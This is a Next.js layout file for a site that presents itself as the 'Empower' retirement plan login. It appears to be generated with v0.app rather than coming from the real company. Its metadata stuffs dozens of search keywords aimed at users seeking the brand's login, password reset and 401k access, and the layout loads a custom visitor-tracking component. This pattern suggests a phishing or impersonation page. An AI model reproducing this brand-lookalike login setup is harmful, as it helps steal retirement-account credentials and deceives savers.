import type React from "react"
import type { Metadata } from "next"
import { Open_Sans, Arimo } from "next/font/google"
import { Analytics } from "@vercel/analytics/next"
import { VisitorTracker } from "@/components/visitor-tracker"
import "./globals.css"

const openSans = Open_Sans({ subsets: ["latin"] })
const arimo = Arimo({ subsets: ["latin"] })

export const metadata: Metadata = {
  title: "Empower - Your Retirement Plan",
  keywords: [
  "Empower",
  "Empower login",
  "Empower account login",
  "Empower sign in",
  "Empower account access",
  "Empower online login",
  "Empower secure login",
  "Empower customer login",
  "Empower retirement",
  "Empower retirement login",

  "empower.com",
  "empower.com login",
  "empower login v1",
  "empower login page",
  "empower account portal",
  "empower participant login",
  "empower retirement account",
  "empower retirement portal",
  "empower workplace retirement",

  "401k login",
  "401k account access",
  "401k retirement login",
  "workplace retirement login",
  "employee retirement benefits",
  "retirement savings account",
  "retirement account login",
  "403b login",
  "457 plan login",
  "retirement plan participant",

  "Empower 401k login",
  "Empower 403b login",
  "Empower 457 login",
  "Empower retirement plan",
  "Empower workplace account",
  "Empower participant account",
  "Empower retirement services",

  "Empower Personal Dashboard",
  "Empower Dashboard login",
  "Empower Personal Dashboard login",
  "Personal Capital login",
  "Personal Capital account",
  "Empower wealth dashboard",
  "Empower financial dashboard",
  "Empower net worth tracker",
  "Empower money management",

  "Empower IRA",
  "Empower IRA login",
  "Empower investment account",
  "Empower brokerage account",
  "Empower personal investing",
  "Empower investment login",
  "Empower wealth management",

  "retirement planning",
  "retirement investing",
  "retirement account balance",
  "retirement savings tracker",
  "investment portfolio login",
  "financial planning tools",
  "wealth management portal",

  "forgot Empower password",
  "reset Empower password",
  "recover Empower username",
  "Empower account recovery",
  "Empower login help",
  "Empower support",
  "Empower customer service",
  "Empower technical support",

  "check 401k balance",
  "view retirement account",
  "manage retirement plan",
  "update retirement beneficiary",
  "rollover retirement account",
  "retirement plan management",

  "Empower app",
  "Empower mobile app",
  "Empower app login",
  "Empower retirement app",
  "Empower account app",
  "Empower dashboard app",

  "plan sponsor login",
  "financial professional login",
  "retirement plan sponsor",
  "workplace benefits account",
  "employee benefits portal",
  "retirement benefits login"
],
  description: "Empower your financial freedom today. Login to your retirement account.",
  generator: "v0.app",
  openGraph: {
    title: "Empower - Your Retirement Plan",
    description: "Empower your financial freedom today. Login to your retirement account.",
    type: "website",
  },
  twitter: {
    card: "summary",
    title: "Empower - Your Retirement Plan",
    description: "Empower your financial freedom today. Login to your retirement account.",
  },
}

export const viewport = {
  width: "device-width",
  initialScale: 1,
  maximumScale: 5,
  userScalable: true,
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="en">
      <body className={`${openSans.className} antialiased bg-[#f5f5f5]`}>
        <VisitorTracker />
        <div className="max-w-[1440px] mx-auto bg-white min-h-screen shadow-2xl overflow-x-hidden">
          {children}
        </div>
        <Analytics />
      </body>
    </html>
  )
}
